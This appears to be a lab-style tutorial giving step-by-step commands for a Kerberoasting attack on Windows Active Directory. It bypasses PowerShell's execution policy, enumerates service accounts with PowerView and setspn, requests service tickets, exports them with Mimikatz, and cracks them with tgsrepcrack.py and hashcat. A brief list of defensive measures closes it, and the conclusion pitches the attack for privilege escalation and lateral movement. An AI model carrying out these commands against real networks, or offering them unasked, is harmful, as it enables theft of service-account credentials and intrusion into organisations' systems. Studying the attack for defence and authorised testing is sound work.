

Kerberoasting is a post-exploitation attack used to extract service account credentials from a Windows Active Directory environment. Below are the steps involved in performing a Kerberoasting attack along with the necessary commands.

---

## **1. Bypass PowerShell Execution Policy**

Before running scripts, bypass PowerShell's execution policy:

```powershell
powershell -ep bypass
```

---

## **2. Import PowerView Module**

Load PowerView, a tool for Active Directory enumeration:

```powershell
. .\PowerView.ps1
```

---

## **3. Identify Service Accounts with SPNs**

Find user accounts with associated Service Principal Names (SPNs):

```powershell
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

---

## **4. Enumerate SPNs in the Domain**

List all registered SPNs in the domain:

```powershell
setspn -T research -Q */*
```

---

## **5. Check for Existing Kerberos Tickets**

To list the current Kerberos tickets in use:

```powershell
klist
```

---

## **6. Request a Ticket Granting Service (TGS) Ticket**

Request a Kerberos service ticket for a specific service account:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/research.SECURITY.local:1434"
```

---

## **7. Extract Kerberos Tickets using Mimikatz**

Use Mimikatz to export the tickets for offline cracking:

```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

---

## **8. Crack the Extracted Ticket**

### **Using a Python Script**

```powershell
python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi
```

### **Using Hashcat for Faster Cracking**

```bash
hashcat -m 13100 <ticket-hash-file> <wordlist>
```

- `-m 13100` specifies Kerberos 5 TGS-REP as the hash type.

---

## **Conclusion**

Kerberoasting is an effective attack to extract service account credentials. After obtaining the password, you can escalate privileges or move laterally within the network.

**Defensive Measures:**

- Enforce strong passwords for service accounts.
- Implement monitoring for abnormal Kerberos requests.
- Limit service accounts’ privileges to minimize the impact of compromise.
